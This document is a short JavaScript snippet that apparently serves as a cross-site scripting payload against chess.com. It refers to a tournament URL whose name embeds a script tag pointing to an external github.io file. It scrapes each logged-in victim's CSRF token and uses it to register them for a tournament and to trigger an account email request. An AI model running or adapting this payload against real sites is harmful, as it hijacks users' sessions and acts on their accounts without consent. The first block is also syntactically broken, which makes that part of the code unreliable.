

fetch("https://www.chess.com/tournament/lt-script-src-yellowrook1-github-io-a-js-gt-lt-script-gt").then((response) => response.text()).then((text) => {
      var token = text.match(/("token":".+?)["]/)[1].substr(9)
      fetch("https://www.chess.com/callback/tournaments/register/358301", {
  "body": `{\"_token\":\"` + token + `\",\"confirm\":1}`,
  "method": "POST",
});
      
      
      }

fetch("https://www.chess.com/settings/change-email").then((response) => response.text())
    .then((text) => {
            var token = text.match(/("token":".+?)["]/)[1].substr(9); 
            fetch("https://www.chess.com/callback/resend-activation-email", {
            "headers": {
                "content-type": "application/x-www-form-urlencoded",
            },
            "body": "_token=" + token,
            "method": "POST",
        }).then(response => response.json())
  .then(data => {alert(data.message.substr(37))});
    });
